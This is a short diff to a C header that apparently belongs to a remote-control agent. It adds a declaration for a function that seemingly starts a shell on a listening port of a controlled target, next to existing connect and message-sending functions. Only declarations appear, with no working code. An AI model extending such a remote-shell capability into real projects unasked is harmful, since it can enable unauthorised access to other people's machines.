@@ -29,5 +29,7 @@ int CC_Agent_Connect(int target,char *remoteip,int rport);
 #define CC_AGENT_SENDMSG_OK        1
 int CC_Agent_SendMsg(int target,char *msg,int msglen);
 
-
+#define CC_AGENT_STARTSHELL_ERROR  -1
+#define CC_AGENT_STARTSHELL_OK      1
+int CC_Agent_StartShell(int target,int lport,int maxnum,int usec);
 #endif
